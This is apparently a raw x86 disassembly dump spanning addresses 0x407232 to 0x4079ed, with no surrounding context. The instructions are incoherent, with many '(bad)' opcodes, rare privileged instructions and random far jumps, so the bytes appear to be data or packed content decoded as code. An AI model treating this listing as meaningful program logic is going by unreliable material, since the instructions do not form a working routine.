  407232:	sub    DWORD PTR [ebx-0x383da7ac],0xe73997e6
  40723c:	rol    DWORD PTR [eax+0x45f0ae78],0x83
  407243:	fcmovnb st,st(6)
  407245:	das    
  407246:	loopne 0x407296
  407248:	test   esi,eax
  40724a:	imul   ebp,edx,0x88e20ac2
  407250:	icebp  
  407251:	test   ecx,edx
  407253:	jp     0x407239
  407255:	mov    esi,0x3c5218ef
  40725a:	and    esp,ebp
  40725c:	cmp    eax,0xbf90aba
  407261:	pushf  
  407262:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407263:	icebp  
  407264:	mov    WORD PTR [esi-0x3b],fs
  407267:	loop   0x40727d
  407269:	sbb    al,0xfe
  40726b:	dec    edx
  40726c:	and    esi,DWORD PTR [eax+0x7207cebd]
  407272:	and    dl,bh
  407274:	mov    esp,0xfdc9e13
  407279:	cmp    DWORD PTR [edi-0x69],esp
  40727c:	sbb    dh,dl
  40727e:	ret    0x1f5
  407281:	sti    
  407282:	pop    ss
  407283:	jp     0x4072e5
  407285:	cmp    dh,BYTE PTR [edi+ebp*4+0x2de5a631]
  40728c:	xchg   ebp,eax
  40728d:	(bad)  
  40728e:	ds sahf 
  407290:	mov    ah,0x61
  407292:	sub    al,0x0
  407294:	inc    eax
  407295:	(bad)  
  407296:	repz leave 
  407298:	xor    bh,al
  40729a:	inc    ebx
  40729b:	je     0x4072d0
  40729d:	add    BYTE PTR [ebp-0x53],dl
  4072a0:	fadd   st,st(5)
  4072a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072a3:	aaa    
  4072a4:	xor    dh,BYTE PTR [ebx]
  4072a6:	adc    ah,ah
  4072a8:	fdivp  st(0),st
  4072aa:	and    ah,BYTE PTR [ebx]
  4072ac:	cwde   
  4072ad:	cmp    al,BYTE PTR cs:[eax]
  4072b0:	add    esi,DWORD PTR [edi+0x130a36d7]
  4072b6:	arpl   bx,ax
  4072b8:	out    0x1b,eax
  4072ba:	or     al,0xba
  4072bc:	jmp    DWORD PTR [ecx-0x77f6613e]
  4072c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072c3:	mov    ds:0xae0364cf,eax
  4072c8:	sbb    DWORD PTR [ebp+0x8],edx
  4072cb:	inc    edx
  4072cc:	xor    eax,0xfade6b7f
  4072d1:	cmp    al,0xba
  4072d3:	loopne 0x40728c
  4072d5:	pop    ebx
  4072d6:	cmp    cl,ch
  4072d8:	adc    eax,DWORD PTR [ebp-0x10742cb9]
  4072de:	dec    esi
  4072df:	push   0x5a
  4072e1:	jne    0x407303
  4072e3:	into   
  4072e4:	cmp    DWORD PTR [ebp-0x41],eax
  4072e7:	and    BYTE PTR [edx],0x6d
  4072ea:	adc    BYTE PTR [ecx-0x34],ah
  4072ed:	adc    eax,DWORD PTR [ebp-0x19]
  4072f0:	mov    ah,0x42
  4072f2:	cli    
  4072f3:	leave  
  4072f4:	repnz rol dl,cl
  4072f7:	and    dh,BYTE PTR [eax]
  4072f9:	daa    
  4072fa:	(bad)  [ecx-0x9]
  4072fd:	sbb    ah,dh
  4072ff:	scas   al,BYTE PTR es:[edi]
  407300:	pop    esp
  407301:	jo     0x4072a5
  407303:	xchg   BYTE PTR ds:[ecx+0x1c],ch
  407307:	xchg   dl,bh
  407309:	pop    edi
  40730a:	xchg   esp,eax
  40730b:	jg     0x407312
  40730d:	sub    al,0x6f
  40730f:	adc    DWORD PTR [esi-0x7b],ebx
  407312:	bswap  ebx
  407314:	mov    esi,0x68d692f7
  407319:	mov    BYTE PTR [ebx],ah
  40731b:	fwait
  40731c:	jl     0x4072fd
  40731e:	pop    ecx
  40731f:	cli    
  407320:	test   bl,al
  407322:	inc    ecx
  407323:	icebp  
  407324:	aad    0x9e
  407326:	shr    DWORD PTR [edx+ebp*2+0x5d],1
  40732a:	fwait
  40732b:	sbb    DWORD PTR [ebx],esp
  40732d:	cmp    eax,0x7a459fb
  407332:	loopne 0x407392
  407334:	(bad)  
  407335:	adc    ebx,DWORD PTR [ebp-0xd]
  407338:	jp     0x407375
  40733a:	dec    edx
  40733b:	and    DWORD PTR [eax+0x2fc1c26f],esi
  407341:	test   al,0x8a
  407343:	ds push es
  407345:	add    DWORD PTR [ecx-0x52],esi
  407348:	xor    ch,BYTE PTR [ecx]
  40734a:	mov    edx,0xbf0b33ca
  40734f:	or     ebp,edi
  407351:	ins    DWORD PTR es:[edi],dx
  407352:	mov    edi,0x62c84d92
  407357:	adc    eax,0xcd054881
  40735c:	pop    ebx
  40735d:	sbb    al,BYTE PTR [edx-0x9]
  407360:	loop   0x4073d3
  407362:	iret   
  407363:	imul   edx,DWORD PTR [edx+edx*1+0xab52df8],0xffffff8b
  40736b:	pop    ss
  40736c:	mov    dh,0xd0
  40736e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40736f:	add    al,0x5
  407371:	xor    eax,0x149fd05d
  407376:	or     eax,0xcb9015a6
  40737b:	add    DWORD PTR [ecx-0x588a60c],ebx
  407381:	iret   
  407382:	dec    esp
  407383:	(bad)  
  407384:	in     eax,dx
  407385:	stc    
  407386:	pop    ebp
  407387:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407388:	test   DWORD PTR cs:[edx],ecx
  40738b:	inc    ecx
  40738c:	pop    edi
  40738d:	(bad)
  407390:	dec    eax
  407391:	sub    bh,BYTE PTR [esi]
  407393:	fistp  DWORD PTR [eax+esi*1]
  407396:	add    ch,BYTE PTR [eax+0x5f]
  407399:	adc    DWORD PTR [ebx],edx
  40739b:	les    eax,FWORD PTR [ecx-0x71915bed]
  4073a1:	retf   
  4073a2:	lahf   
  4073a3:	(bad)  
  4073a4:	fist   WORD PTR [ecx+0x655c64c2]
  4073aa:	mov    bl,0x21
  4073ac:	xchg   ebx,eax
  4073ad:	and    BYTE PTR [ebp-0x52],ah
  4073b0:	and    dl,BYTE PTR [eax+0x59bbf5d2]
  4073b6:	add    DWORD PTR [edx-0x6],0x5f
  4073ba:	aam    0x8e
  4073bc:	out    dx,al
  4073bd:	inc    ebx
  4073be:	int3   
  4073bf:	mov    ecx,0xded5856b
  4073c4:	push   ebp
  4073c5:	pop    esi
  4073c6:	adc    al,0x23
  4073c8:	mov    ecx,0x1f41556a
  4073cd:	fild   QWORD PTR [eax+0x2e]
  4073d0:	scas   al,BYTE PTR es:[edi]
  4073d1:	popa   
  4073d2:	mov    ch,0xf5
  4073d4:	cld    
  4073d5:	lea    edx,[ebx]
  4073d7:	scas   al,BYTE PTR es:[edi]
  4073d8:	dec    edi
  4073d9:	outs   dx,WORD PTR ds:[esi]
  4073db:	fwait
  4073dc:	stos   DWORD PTR es:[edi],eax
  4073dd:	or     BYTE PTR [ebx],al
  4073df:	cmp    dl,0x9a
  4073e2:	fwait
  4073e3:	mov    bh,0x46
  4073e5:	inc    edx
  4073e6:	mov    ebp,0xc985a433
  4073eb:	cmc    
  4073ec:	and    bl,BYTE PTR [edi+0x200f3f7]
  4073f2:	and    eax,DWORD PTR [ebp-0x103617b0]
  4073f8:	aam    0x36
  4073fa:	inc    esp
  4073fb:	icebp  
  4073fc:	ds dec ecx
  4073fe:	push   eax
  4073ff:	jne    0x407429
  407401:	xlat   BYTE PTR ds:[ebx]
  407402:	retf   0x23e1
  407405:	inc    ebp
  407406:	icebp  
  407407:	ret    
  407408:	sub    al,0xc2
  40740a:	xor    BYTE PTR [ebx-0xc],ch
  40740d:	adc    esp,DWORD PTR [ebx+0x2f24cd22]
  407413:	mov    edi,DWORD PTR [edx-0x15]
  407416:	fnstsw WORD PTR [edx-0x325c918c]
  40741c:	stos   BYTE PTR es:[edi],al
  40741d:	(bad)  [ebx-0x77]
  407420:	adc    al,0x85
  407422:	xchg   esp,eax
  407423:	nop
  407424:	jmp    0x2368:0x1fb22326
  40742b:	mov    esp,DWORD PTR [edx+eiz*4-0x2]
  40742f:	xor    ch,BYTE PTR [eax]
  407431:	pop    edx
  407432:	jp     0x407425
  407434:	jbe    0x407417
  407436:	mov    cl,0x91
  407438:	loop   0x4073cb
  40743a:	in     eax,dx
  40743b:	mov    bh,cl
  40743d:	aam    0xc2
  40743f:	cdq    
  407440:	inc    ebp
  407441:	(bad)  
  407442:	aam    0x3c
  407444:	leave  
  407445:	dec    esp
  407446:	aas    
  407447:	scas   al,BYTE PTR es:[edi]
  407448:	push   eax
  407449:	fdivp  st(4),st
  40744b:	int3   
  40744c:	dec    esp
  40744d:	pop    es
  40744e:	mov    edx,0xa55efaea
  407453:	cmp    ecx,DWORD PTR [eax+eiz*8-0x7a6de8bd]
  40745a:	out    0xcf,eax
  40745c:	sbb    esi,DWORD PTR [edi]
  40745e:	test   BYTE PTR [edx-0x4edcd9c8],0x7c
  407465:	add    eax,0x39886ddf
  40746a:	shl    ecx,0x6
  40746d:	pop    ds
  40746e:	jmp    0x22fc:0xdc0eb392
  407475:	xchg   BYTE PTR [ebx+0x52845297],al
  40747b:	stc    
  40747c:	(bad)  [eax+0x3122ae1c]
  407482:	(bad)  
  407483:	ins    DWORD PTR es:[edi],dx
  407484:	inc    edi
  407485:	inc    ebp
  407486:	add    edi,DWORD PTR [esi]
  407488:	sti    
  407489:	(bad)  
  40748a:	call   0xf106b704
  40748f:	sbb    BYTE PTR [edx+0x7ff44fb2],bl
  407495:	adc    dl,BYTE PTR ds:0x6dad
  40749a:	fisubr WORD PTR [ecx-0x156ecede]
  4074a0:	cmp    DWORD PTR [ebx],edx
  4074a2:	stos   BYTE PTR es:[edi],al
  4074a3:	cmp    dh,BYTE PTR [ecx]
  4074a5:	loop   0x407493
  4074a7:	jg     0x407481
  4074a9:	push   ss
  4074aa:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4074ac:	aad    0x9a
  4074ae:	push   ebx
  4074af:	mov    esp,0xaddfa1df
  4074b4:	inc    ecx
  4074b5:	push   edi
  4074b6:	inc    edx
  4074b7:	and    DWORD PTR [ebx-0x34],esi
  4074ba:	xor    DWORD PTR [esi+0x4f8a8b07],edx
  4074c0:	imul   eax,DWORD PTR [edi-0x4f981cff],0x4
  4074c7:	daa    
  4074c8:	sbb    eax,0xc8d5b697
  4074cd:	pop    ebx
  4074ce:	sbb    BYTE PTR [edi],bh
  4074d0:	xlat   BYTE PTR ds:[ebx]
  4074d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074d2:	lock mov ch,0xa
  4074d5:	push   edi
  4074d6:	dec    ebx
  4074d7:	(bad)  
  4074d8:	call   0x6bda7cda
  4074dd:	into   
  4074de:	push   ebx
  4074df:	sbb    al,bl
  4074e1:	xchg   edx,eax
  4074e2:	addr16 xchg edi,eax
  4074e4:	xchg   edi,eax
  4074e5:	call   0xb943:0xa178bcda
  4074ec:	data16 and BYTE PTR [edx],0x8c
  4074f0:	jle    0x4074b3
  4074f2:	aas    
  4074f3:	gs stos BYTE PTR es:[edi],al
  4074f5:	dec    ebx
  4074f6:	shl    BYTE PTR [edi+0x466b02de],1
  4074fc:	mov    dl,0x30
  4074fe:	loopne 0x40754c
  407500:	mov    esi,0x247809d2
  407505:	add    ecx,eax
  407507:	mov    ah,BYTE PTR [eax-0x33]
  40750a:	xchg   BYTE PTR [eax-0x2f],ah
  40750d:	xor    DWORD PTR [eax-0x16],esi
  407510:	inc    eax
  407511:	fldcw  WORD PTR [edx-0x197ece26]
  407517:	pop    esi
  407518:	mov    dl,0x24
  40751a:	mov    dl,0x3c
  40751c:	add    esi,eax
  40751e:	xchg   BYTE PTR [ecx-0x1c41f390],dh
  407524:	xor    DWORD PTR [edi],0xfffffff0
  407527:	out    0x8f,al
  407529:	adc    al,0x1a
  40752b:	ror    DWORD PTR [ecx+0x73ffc457],cl
  407531:	jl     0x407564
  407533:	int3   
  407534:	pop    es
  407535:	mov    ebp,0x306be88a
  40753a:	pop    edx
  40753b:	js     0x407589
  40753d:	add    DWORD PTR ds:0xb4cdde8a,edi
  407543:	pusha  
  407544:	out    dx,eax
  407545:	xor    DWORD PTR [ebp+0x70de85b],esi
  40754b:	leave  
  40754c:	imul   ecx,eax,0x53
  40754f:	jmp    0x38a6e22c
  407554:	loope  0x40758d
  407556:	inc    ecx
  407557:	out    0xb2,al
  407559:	adc    al,0x8f
  40755b:	shr    DWORD PTR [ebp+0x57],cl
  40755e:	cmp    eax,edi
  407560:	jno    0x4075db
  407562:	imul   edx,esi,0xffffffb2
  407565:	ja     0x407547
  407567:	(bad)  
  407568:	mov    esi,0x92781954
  40756d:	add    ebp,ecx
  40756f:	mov    ch,BYTE PTR [eax]
  407571:	int    0xbd
  407573:	pusha  
  407574:	ins    BYTE PTR es:[edi],dx
  407575:	xor    DWORD PTR [eax-0x16],esp
  407578:	xchg   ebx,eax
  407579:	xchg   ebx,eax
  40757a:	stos   BYTE PTR es:[edi],al
  40757b:	sti    
  40757c:	xor    esi,esi
  40757e:	out    0xed,al
  407580:	mov    dl,0x98
  407582:	mov    dl,0xfa
  407584:	add    DWORD PTR [esi+0xc321786],edi
  40758a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40758b:	jecxz  0x4075fc
  40758d:	aaa    
  40758e:	jns    0x407576
  407590:	pop    es
  407591:	adc    al,0xbc
  407593:	rcr    DWORD PTR [edi+0x739a0757],cl
  407599:	repz xor DWORD PTR ds:0xcd8a7b07,ebp
  4075a0:	imul   ecx,DWORD PTR [edi+0x1],0xffffffe1
  4075a4:	addr16 push ebx
  4075a6:	loop   0x4075cf
  4075a8:	xchg   DWORD PTR [edi+0x3112dedb],edx
  4075ae:	scas   eax,DWORD PTR es:[edi]
  4075af:	jmp    0xc331:0x1daa76b1
  4075b6:	out    0xc2,al
  4075b8:	mov    dl,0x1c
  4075ba:	mov    dl,0xb
  4075bc:	add    DWORD PTR [ecx],esi
  4075be:	xchg   BYTE PTR [edx-0x20],ch
  4075c1:	or     al,0xfb
  4075c3:	jecxz  0x407591
  4075c5:	aaa    
  4075c6:	add    eax,0xdd143be6
  4075cb:	rcl    DWORD PTR ds:0x73860d57,cl
  4075d1:	mov    ds:0xf7075531,eax
  4075d6:	mov    ah,BYTE PTR [ebx-0x6cfee195]
  4075dc:	shr    DWORD PTR [bp+si],1
  4075df:	daa    
  4075e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075e1:	xchg   edi,eax
  4075e2:	(bad)  
  4075e3:	aad    0x9d
  4075e5:	pop    ebx
  4075e6:	mov    esi,0x90a7533f
  4075eb:	mov    ch,0x18
  4075ed:	mov    ah,0x4b
  4075ef:	shr    al,0xfe
  4075f2:	pop    es
  4075f3:	clc    
  4075f4:	imul   esp,edi,0x53
  4075f7:	scas   eax,DWORD PTR es:[edi]
  4075f8:	fsubr  DWORD PTR ds:0x9a5d9467
  4075fe:	retf   0x42b9
  407601:	adc    al,0xfa
  407603:	shr    ebp,cl
  407605:	push   edi
  407606:	push   ss
  407607:	js     0x40767c
  407609:	sub    dh,BYTE PTR [ecx+ecx*8]
  40760c:	mov    dl,0x23
  40760e:	loopne 0x40767e
  407610:	mov    esi,0x937885b2
  407615:	add    edi,edx
  407617:	mov    dh,BYTE PTR [eax+0x2d60d4cd]
  40761d:	xor    ebp,ebp
  40761f:	jmp    0x407698
  407621:	dec    edi
  407622:	pop    es
  407623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407624:	imul   ecx,esp,0x53
  407627:	dec    ebp
  407628:	fcomp  DWORD PTR [esi-0x65a3b699]
  40762e:	(bad)  
  40762f:	mov    esp,0xb950a1a7
  407634:	or     eax,0xa88c9882
  407639:	rcl    DWORD PTR [eax],0xe2
  40763c:	stos   BYTE PTR es:[edi],al
  40763d:	lahf   
  40763e:	rcl    ah,1
  407640:	fimul  WORD PTR [ebx]
  407642:	imul   edi,DWORD PTR [eax-0x4e],0xfffffffd
  407646:	loopne 0x4075e3
  407648:	mov    edi,0x7ad5d568
  40764d:	pop    ebx
  40764e:	std    
  40764f:	aas    
  407650:	and    DWORD PTR [edi+0x48c9b59c],0x49
  407657:	pop    edx
  407658:	mov    dl,0x3
  40765a:	mov    dl,0x70
  40765c:	add    DWORD PTR ds:0xca58286,ebp
  407662:	push   ecx
  407663:	jecxz  0x407694
  407665:	aaa    
  407666:	dec    ecx
  407667:	out    0xbb,al
  407669:	adc    al,0x52
  40766b:	sar    ebp,cl
  40766d:	push   edi
  40766e:	pop    esi
  40766f:	ds jae 0x407656
  407672:	xor    DWORD PTR [ecx-0x137598f9],eax
  407678:	imul   esp,DWORD PTR [edx],0x1
  40767b:	xchg   esp,eax
  40767c:	addr16 mov bh,0x9c
  40767f:	daa    
  407680:	xchg   ecx,eax
  407681:	xchg   edi,eax
  407682:	data16 aad 0x7b
  407685:	pop    ebx
  407686:	rcl    DWORD PTR [esi+edi*1],0xe8
  40768a:	test   al,0x7d
  40768c:	imul   ebx,DWORD PTR [edi+0x53],0x79
  407690:	fmul   DWORD PTR [esi+0x67]
  407693:	mov    ch,0x80
  407695:	call   0xb92d:0xa1e1bc98
  40769c:	jecxz  0x407620
  40769e:	mov    bh,0x8c
  4076a0:	or     al,cl
  4076a2:	mov    ah,0x8
  4076a4:	stos   BYTE PTR es:[edi],al
  4076a5:	dec    esp
  4076a6:	shl    BYTE PTR [edx],1
  4076a8:	fdivp  st(7),st
  4076aa:	imul   ebp,DWORD PTR [eax-0x701f6f4e],0xffffffbe
  4076b1:	in     al,dx
  4076b2:	jmp    0x40772c
  4076b4:	stos   BYTE PTR es:[edi],al
  4076b5:	add    DWORD PTR [ebx+0x52cdc48a],edi
  4076bb:	pusha  
  4076bc:	ins    BYTE PTR es:[edi],dx
  4076bd:	xor    DWORD PTR [edi-0x16],ebp
  4076c0:	push   esi
  4076c1:	mov    edi,0x2231bbaa
  4076c6:	out    0x9d,al
  4076c8:	mov    dl,0xfa
  4076ca:	mov    dl,0x86
  4076cc:	add    DWORD PTR [ebp+0xcd10e86],edi
  4076d2:	dec    ebx
  4076d3:	jecxz  0x4076b3
  4076d5:	aaa    
  4076d6:	scas   al,BYTE PTR es:[edi]
  4076d7:	out    0x2,al
  4076d9:	adc    al,0xf0
  4076db:	shl    DWORD PTR [ecx],cl
  4076dd:	push   esi
  4076de:	dec    ebp
  4076df:	inc    esp
  4076e0:	fisubr WORD PTR [ebp+0x68b2336b]
  4076e6:	loopne 0x40768e
  4076e8:	mov    edi,0x49d5fd02
  4076ed:	pop    ebx
  4076ee:	inc    eax
  4076ef:	aas    
  4076f0:	out    0xa7,al
  4076f2:	xchg   edi,eax
  4076f3:	mov    ch,0xd1
  4076f5:	icebp  
  4076f6:	dec    ebx
  4076f7:	pop    edx
  4076f8:	call   0x6bd37e38
  4076fd:	in     eax,dx
  4076fe:	push   ebx
  4076ff:	std    
  407700:	fcom   st(0)
  407702:	addr16 adc al,cl
  407705:	call   0xb9bc:0xa115bc2e
  40770c:	xor    eax,DWORD PTR [edx-0x7f8c2ab8]
  407712:	xor    al,0x19
  407714:	mov    dl,0x9e
  407716:	loopne 0x40770b
  407718:	mov    esi,0xd8783651
  40771d:	add    DWORD PTR [ebx],ebp
  40771f:	mov    bh,BYTE PTR [ecx+0x6160bdcd]
  407725:	xor    DWORD PTR [ecx-0x16],ecx
  407728:	mov    eax,ds:0x31fbaa6b
  40772d:	sbb    al,0xe6
  40772f:	mov    al,0xa6
  407731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407732:	addr16 ja 0x407703
  407735:	call   0xb9dc:0xa188bcb2
  40773c:	sbb    eax,DWORD PTR [edx-0x3e3c73e9]
  407742:	cli    
  407743:	push   edi
  407744:	stos   BYTE PTR es:[edi],al
  407745:	inc    edi
  407746:	rol    BYTE PTR [eax+0x166be2de],1
  40774c:	mov    dl,0x85
  40774e:	loopne 0x40778f
  407750:	mov    esi,0x68780340
  407755:	add    eax,ebx
  407757:	mov    al,BYTE PTR [eax-0x33]
  40775a:	or     DWORD PTR [eax-0x3d],esp
  40775d:	xor    ebp,edx
  40775f:	jmp    0xba31:0x59aa42f7
  407766:	out    0xb7,al
  407768:	mov    dl,0x82
  40776a:	mov    dl,0x2c
  40776c:	add    DWORD PTR [ebx-0x7a],esi
  40776f:	mov    BYTE PTR [edi],cl
  407771:	or     al,0x18
  407773:	jecxz  0x4077d2
  407775:	aaa    
  407776:	jmp    0x40775e
  407778:	cmp    al,0x14
  40777a:	(bad)  
  40777c:	shl    ah,cl
  40777e:	shr    BYTE PTR [ebx],1
  407780:	fisub  WORD PTR [edi+0x37b2e06b]
  407786:	loopne 0x40771b
  407788:	mov    esi,0xc7882b7
  40778d:	add    edx,esi
  40778f:	mov    ch,BYTE PTR [eax+0x3560c0cd]
  407795:	xor    DWORD PTR [ebx-0x16],edi
  407798:	mov    dl,0xe1
  40779a:	stos   BYTE PTR es:[edi],al
  40779b:	jge    0x4077ce
  40779d:	sub    al,0xe6
  40779f:	xor    BYTE PTR [edx+0x1bfb215],0xc2
  4077a6:	xchg   BYTE PTR [ecx+esi*8],cl
  4077a9:	or     al,0xa2
  4077ab:	jecxz  0x4077aa
  4077ad:	aaa    
  4077ae:	dec    esp
  4077af:	out    0x45,al
  4077b1:	adc    al,0xbe
  4077b3:	shl    DWORD PTR [ecx+0x73e80e57],cl
  4077b9:	xchg   esi,eax
  4077ba:	xor    DWORD PTR [ecx+0x7],ecx
  4077bd:	in     al,0x8a
  4077bf:	add    DWORD PTR [ebx+0x5],ebp
  4077c2:	add    DWORD PTR [edx+0x67],esp
  4077c5:	shl    BYTE PTR ds:[edi],1
  4077c8:	arpl   WORD PTR [edi+0x5b40d55e],dx
  4077ce:	jns    0x40780f
  4077d0:	cmp    al,0xaa
  4077d3:	inc    esi
  4077d4:	xor    al,0xb
  4077d6:	jg     0x4077c3
  4077d8:	xor    BYTE PTR [ecx-0x7d344614],ah
  4077de:	pop    ecx
  4077df:	mov    esp,cs
  4077e1:	shr    DWORD PTR [edx],0x8d
  4077e4:	stos   BYTE PTR es:[edi],al
  4077e5:	mov    eax,ds:0x11de8dd0
  4077ea:	imul   edx,DWORD PTR [edi+0x64e0afb2],0xffffffbe
  4077f1:	push   ebp
  4077f2:	sti    
  4077f3:	js     0x4077b0
  4077f5:	add    DWORD PTR [eax],ebx
  4077f7:	mov    ch,BYTE PTR [edx-0xa9f2a33]
  4077fd:	xor    DWORD PTR [edx+0x45],esi
  407800:	call   0x6b847f86
  407805:	fwait
  407806:	push   ebx
  407807:	mov    cl,0xd8
  407809:	aam    0x67
  40780b:	sbb    edx,DWORD PTR [esi]
  40780d:	call   0xb93e:0xa1bbbcb6
  407814:	icebp  
  407815:	adc    BYTE PTR [esp+ecx*4-0x2bd3e43],0xaa
  40781d:	pop    es
  40781e:	rcl    BYTE PTR [edx+0x386ba2de],1
  407824:	mov    dl,0xf6
  407826:	loopne 0x407847
  407828:	mov    esi,0xed78505a
  40782d:	add    ebp,esi
  40782f:	mov    dh,BYTE PTR [edi]
  407831:	int    0x89
  407833:	pusha  
  407834:	dec    esp
  407835:	xor    DWORD PTR [ecx],ebx
  407837:	jmp    0x5331:0xc5aa4109
  40783e:	out    0x6d,al
  407840:	mov    dl,0xa0
  407842:	mov    dl,0xb8
  407844:	add    DWORD PTR [esi+0xc49af86],eax
  40784a:	(bad)  
  40784b:	jecxz  0x40782f
  40784d:	aaa    
  40784e:	inc    esi
  40784f:	out    0x4c,al
  407851:	adc    al,0x7f
  407853:	shl    DWORD PTR [edi+edx*2+0x36],cl
  407857:	out    dx,eax
  407858:	jae    0x4077ec
  40785a:	xor    esi,edx
  40785c:	pop    es
  40785d:	mov    eax,0x7f6b338a
  407862:	add    DWORD PTR [edx],edx
  407864:	and    esi,DWORD PTR [si+0x3627]
  407869:	xchg   edi,eax
  40786a:	and    ebp,edx
  40786c:	(bad)  
  40786d:	pop    ebx
  40786e:	call   0x41e847b2
  407873:	mov    ch,0x92
  407875:	test   eax,0x7be8444b
  40787a:	pop    es
  40787b:	fisubr WORD PTR [ebx+0x5f]
  40787e:	push   ebx
  40787f:	call   0x7ea7cf5c
  407884:	mov    cl,0x9a
  407886:	scas   eax,DWORD PTR es:[edi]
  407887:	mov    esp,0xb99da1a8
  40788c:	push   edi
  40788d:	and    BYTE PTR [edx],0x8c
  407890:	xor    eax,eax
  407892:	loope  0x4078bb
  407894:	pop    es
  407895:	dec    ebx
  407896:	mov    dl,BYTE PTR [edi]
  407898:	imul   esp,DWORD PTR [ecx+eax*1+0x79],0x67
  40789d:	xor    ecx,DWORD PTR [edi+eiz*1]
  4078a0:	and    eax,0x72d53997
  4078a5:	pop    ebx
  4078a6:	xchg   ecx,eax
  4078a7:	aas    
  4078a8:	sahf   
  4078a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078aa:	dec    eax
  4078ab:	mov    ch,0xa2
  4078ad:	sbb    ecx,DWORD PTR [ebx-0x1a]
  4078b0:	call   0x6b6f8075
  4078b5:	push   0xced8dd53
  4078ba:	addr16 out dx,al
  4078bc:	jbe    0x407858
  4078be:	sub    DWORD PTR [edi+ecx*2+0x14b9e6a1],edi
  4078c5:	lods   al,BYTE PTR ds:[esi]
  4078c6:	push   es
  4078c7:	adc    DWORD PTR [ebx-0x7a],esi
  4078ca:	xor    edi,esp
  4078cc:	pop    es
  4078cd:	fmul   QWORD PTR [edx+0x1826bd7]
  4078d3:	cwde   
  4078d4:	addr16 leave 
  4078d6:	(bad)  
  4078d7:	daa    
  4078d8:	into   
  4078d9:	xchg   edi,eax
  4078da:	test   ebp,edx
  4078dc:	or     eax,0xbe13315b
  4078e1:	jae    0x40788d
  4078e3:	jb     0x407916
  4078e5:	jae    0x4078cd
  4078e7:	fbstp  TBYTE PTR [edx+0x1d0b2eb]
  4078ed:	into   
  4078ee:	sub    DWORD PTR [esp+ebx*1-0x1846885f],edi
  4078f5:	add    ah,0x8c
  4078f8:	stos   BYTE PTR es:[edi],al
  4078f9:	sar    DWORD PTR [ebx-0x2fac55b4],0x77
  407900:	fisubr WORD PTR [ebp+0x7d]
  407903:	xchg   ebx,eax
  407904:	or     cl,BYTE PTR [bp+si]
  407907:	daa    
  407908:	xchg   BYTE PTR [edi+0x4fa7d561],dl
  40790e:	loopne 0x4078fa
  407910:	jp     0x4078c0
  407912:	stos   BYTE PTR es:[edi],al
  407913:	loopne 0x407946
  407915:	dec    ecx
  407916:	out    0xa0,al
  407918:	mov    dl,0x0
  40791a:	mov    dl,0x5f
  40791c:	add    DWORD PTR [esi],edi
  40791e:	xor    DWORD PTR [esi+eiz*4+0x41ae78a1],edi
  407925:	call   0x6c1f72fa
  40792a:	imul   ebp,DWORD PTR [edx-0x4e],0xffffffd3
  40792e:	loopne 0x4079a2
  407930:	mov    esi,0xb07831f2
  407935:	add    DWORD PTR [edx-0x76],esp
  407938:	fmul   st,st(5)
  40793a:	cmp    BYTE PTR [eax+0x2a],ah
  40793d:	xor    DWORD PTR [ecx-0x16],ecx
  407940:	dec    esp
  407941:	fwait
  407942:	stos   BYTE PTR es:[edi],al
  407943:	add    BYTE PTR [ecx],dh
  407945:	data16 out 0x37,al
  407948:	mov    dl,0xfa
  40794a:	mov    dl,0xf0
  40794c:	add    DWORD PTR [ecx-0x7a],esp
  40794f:	enter  0xc01,0x60
  407953:	jecxz  0x407955
  407955:	aaa    
  407956:	das    
  407957:	out    0x1e,al
  407959:	adc    al,0x12
  40795b:	xchg   DWORD PTR [edx-0x21972f7c],ebp
  407961:	iret   
  407962:	imul   ecx,DWORD PTR [edx-0x4e],0xffffffea
  407966:	loopne 0x4078ef
  407968:	mov    esi,0xa578911b
  40796d:	add    DWORD PTR [ebx],eax
  40796f:	mov    cl,BYTE PTR [ecx-0x33]
  407972:	push   ebx
  407973:	pusha  
  407974:	mov    bh,0x31
  407976:	sub    ebp,edx
  407978:	push   es
  407979:	jne    0x407925
  40797b:	mov    WORD PTR [ecx],?
  40797d:	and    dh,ah
  40797f:	out    0xb2,eax
  407981:	mov    ebp,0xc7013bb2
  407986:	xchg   BYTE PTR [ebx-0x80],bl
  407989:	or     al,0x94
  40798b:	jecxz  0x40791b
  40798d:	aaa    
  40798e:	clc    
  40798f:	out    0x82,al
  407991:	adc    al,0x7c
  407993:	rcr    DWORD PTR [ebp+0x57],cl
  407996:	dec    edi
  407997:	jbe    0x407a0c
  407999:	mov    esp,0x4e073231
  40799e:	mov    bh,BYTE PTR [esi+0x6b]
  4079a1:	push   eax
  4079a2:	add    esp,edx
  4079a4:	addr16 mov edi,0x926627da
  4079aa:	mov    esp,DWORD PTR [eax+0x5]
  4079ad:	xor    DWORD PTR [ebx-0x55359f16],ebx
  4079b3:	fs xor esp,ebp
  4079b6:	out    0x12,al
  4079b8:	mov    dl,0x90
  4079ba:	mov    dl,0x16
  4079bc:	add    DWORD PTR [esi+eax*4+0x31],edi
  4079c0:	dec    edx
  4079c1:	or     al,0x87
  4079c3:	jecxz  0x4079e1
  4079c5:	aaa    
  4079c6:	addr16 out 0x58,al
  4079c9:	adc    al,0x6d
  4079cb:	shl    DWORD PTR [ecx+0x73095257],cl
  4079d1:	xor    DWORD PTR [ecx],0x8ade071d
  4079d7:	aas    
  4079d8:	imul   ecx,eax,0x1
  4079db:	push   ds
  4079dc:	addr16 mov ecx,0x972b2754
  4079e2:	dec    ecx
  4079e3:	aad    0xf
  4079e5:	pop    ebx
  4079e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079e7:	aas    
  4079e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079ea:	scas   eax,DWORD PTR es:[edi]
  4079eb:	mov    ch,0xa4
  4079ed:	sbb    BYTE PTR [ebx-0x37],cl
